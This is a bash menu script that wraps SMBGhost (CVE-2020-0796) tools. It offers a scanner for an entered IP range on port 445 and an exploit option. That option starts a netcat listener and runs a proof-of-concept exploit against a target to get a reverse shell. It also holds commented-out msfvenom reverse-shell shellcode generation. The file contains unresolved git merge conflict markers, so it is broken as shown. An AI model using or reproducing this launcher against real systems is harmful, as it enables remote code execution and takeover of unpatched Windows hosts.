#!/bin/bash

ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'

scanner(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Scanner"
    echo -e "${NC}"
    cd /opt/SMBGhost
    echo -e "${W}Please enter the target IP address or IP Range${NC}"
    read TARGET
    python3 scanner.py ${TARGET} 445
}

exploit(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Exploit"
    echo -e "${NC}"
<<<<<<< HEAD
    cd /opt/SMBGhost_Exploit
=======
    cd /opt/CVE-2020-0796
>>>>>>> master
    echo -e "${W}Please enter the IP of listener${NC}"
    read LISTENER
    echo -e "${W}Please enter the port of listener${NC}"
    read PORT
    echo -e "${W}Please enter the target IP${NC}"
    read TARGET
<<<<<<< HEAD
    xterm nc -lvp 8888 &
    xterm -e sudo python3 /opt/SMBGhost_Exploit/Smb_Ghost.py -i ${TARGET} -e --lhost ${LISTENER} --lport 8888
=======
    #echo -e "${YLW}An xterm window will pop-up and generate shellcode\n Once done copy the\nraw shellcode & paste it into the section named ${ORNG}USER_PAYLOAD ${YLW}as is.\n(${RED}'buf' ${YLW}will be replaced with ${ORNG}'USER_PAYLOAD' ${YLW}automatically')${NC}"
    #msfvenom -p windows/shell_reverse_tcp LHOST=${TARGET} LPORT=${PORT} -f py -b '\x00\x0a\x0d\x20' > ~/raw_shell
    #sed -i "s/${OUT}/${IN}/g" ~/raw_shell
    #KD=$(kdialog -h)
    #if [[ ${KD} == "" ]]; then
    #    COM='cat'
    #else
    #    COM='kdialog --geometry 600x800 --textbox'
    #fi 
    #${COM} ~/raw_shell
    #rm ~/raw_shell
    #sleep 2
    #sudo leafpad exploit.py
    #sleep 1
    sudo python CVE-2020-0796-POC.py ${TARGET} -lhost ${LISTENER} -lport ${PORT}
>>>>>>> master
}

PS3='Which module would you like to use?'
    options=("Scanner" "Exploit" "Back")
    select opt in "${options[@]}"
        do
            case $opt in
                "Scanner")
                    scanner
                    ;;

                "Exploit")
                    exploit
                    ;;

                "Back")
                    exit
                    ;;

            esac
        done
    echo -e "${NC}"

sleep 5


##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################